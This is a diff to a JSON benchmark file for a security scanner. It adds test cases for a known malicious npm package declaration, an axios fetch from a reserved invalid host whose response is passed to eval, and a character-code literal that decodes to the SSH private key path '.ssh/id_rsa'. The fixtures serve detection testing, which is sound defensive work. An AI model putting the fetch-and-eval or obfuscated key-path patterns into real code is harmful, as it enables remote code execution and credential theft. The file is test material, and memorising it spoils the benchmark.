@@ -1,5 +1,5 @@
 {
-  "benchmark_version": "1.1.0",
+  "benchmark_version": "1.2.0",
   "cases": [
     {
       "id": "lifecycle",
@@ -105,6 +105,45 @@
         "compose.yaml": "services:\n  marker:\n    image: fixture.invalid/repyy-nonexistent:inert\n    volumes:\n      - ./data:/data:ro\n"
       },
       "safety": "Nonexistent image on a reserved invalid registry. Never start Compose; mount is configuration data only."
+    },
+    {
+      "id": "sourced-package",
+      "title": "Known malicious package declaration without installation",
+      "expected_rules": ["IOC-PKG-GHSA-rqwx-v86m-wwff"],
+      "known_missing": [],
+      "risky": {
+        "package.json": "{\"private\":true,\"dependencies\":{\"process-log\":\"1.0.0\"}}\n"
+      },
+      "control": {
+        "package.json": "{\"private\":true,\"dependencies\":{\"fixture-helper\":\"1.0.0\"}}\n"
+      },
+      "safety": "Only JSON declarations are materialized. The benchmark never installs either dependency."
+    },
+    {
+      "id": "axios-response-execution",
+      "title": "Axios response passed to an execution sink",
+      "expected_rules": ["FLOW-001"],
+      "known_missing": [],
+      "risky": {
+        "loader.mjs": "async function unusedExample() { const response = await axios.get('https://fixture.invalid/data'); eval(response.data); }\n"
+      },
+      "control": {
+        "loader.mjs": "async function unusedExample() { const response = await axios.get('https://fixture.invalid/data'); return response.data; }\n"
+      },
+      "safety": "The function is never called. The reserved invalid domain is not contacted; source is scanned as text."
+    },
+    {
+      "id": "literal-recovery",
+      "title": "Literal-only decoding with source provenance",
+      "expected_rules": ["DECODE-001"],
+      "known_missing": [],
+      "risky": {
+        "marker.js": "const marker = String.fromCharCode(46,115,115,104,47,105,100,95,114,115,97);\n"
+      },
+      "control": {
+        "marker.js": "const marker = String.fromCharCode(72,101,108,108,111);\n"
+      },
+      "safety": "The decoder reads numeric literals as data; neither fixture evaluates or uses the resulting string."
     }
   ]
 }
